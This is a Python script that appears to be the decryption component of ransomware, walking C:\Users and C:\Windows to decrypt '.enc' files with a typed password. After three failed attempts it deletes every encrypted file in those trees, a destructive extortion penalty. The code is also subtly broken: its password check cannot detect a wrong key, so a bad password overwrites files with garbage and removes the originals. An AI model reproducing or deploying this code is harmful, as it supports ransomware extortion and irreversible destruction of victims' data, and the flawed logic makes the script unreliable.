import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Configuration
ITERATIONS = 100000
KEY_LENGTH = 32  # 256 bits

def derive_key(password: bytes) -> bytes:
    # Using a fixed, empty salt for simplicity
    salt = b''  # No salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_LENGTH,
        salt=salt,
        iterations=ITERATIONS,
        backend=default_backend()
    )
    return kdf.derive(password)

def decrypt_file(file_path: str, password: bytes):
    try:
        key = derive_key(password)
        
        with open(file_path, 'rb') as f:
            iv = f.read(16)  # Read the IV
            encrypted_data = f.read()

        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        original_file_path = file_path.rsplit('.enc', 1)[0]

        with open(original_file_path, 'wb') as f:
            f.write(decrypted_data)

        # Optionally, delete the .enc file after decryption
        os.remove(file_path)

        print(f'Decrypted {file_path}')

    except (OSError, PermissionError) as e:
        print(f'Skipped {file_path} due to error: {e}')

def decrypt_directory(directory: str, password: bytes):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.enc'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, password)

def main():
    directories = [r'C:\Users', r'C:\Windows']
    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        password = input('Enter password: ').encode()
        try:
            # Attempt to decrypt a dummy file to check if the password is correct
            test_file_path = directories[0] + r'\test.enc'  # Use a test file to verify the password
            decrypt_file(test_file_path, password)
            print('Password accepted.')
            break
        except Exception as e:
            attempts += 1
            print(f'Invalid password. Attempt {attempts} of {max_attempts}.')
            if attempts == max_attempts:
                # Delete all .enc files if maximum attempts are reached
                for directory in directories:
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.endswith('.enc'):
                                os.remove(os.path.join(root, file))
                print('Maximum attempts reached. Deleted all .enc files.')
                return

    # Proceed with decryption if the password is correct
    for directory in directories:
        decrypt_directory(directory, password)

if __name__ == '__main__':
    main()
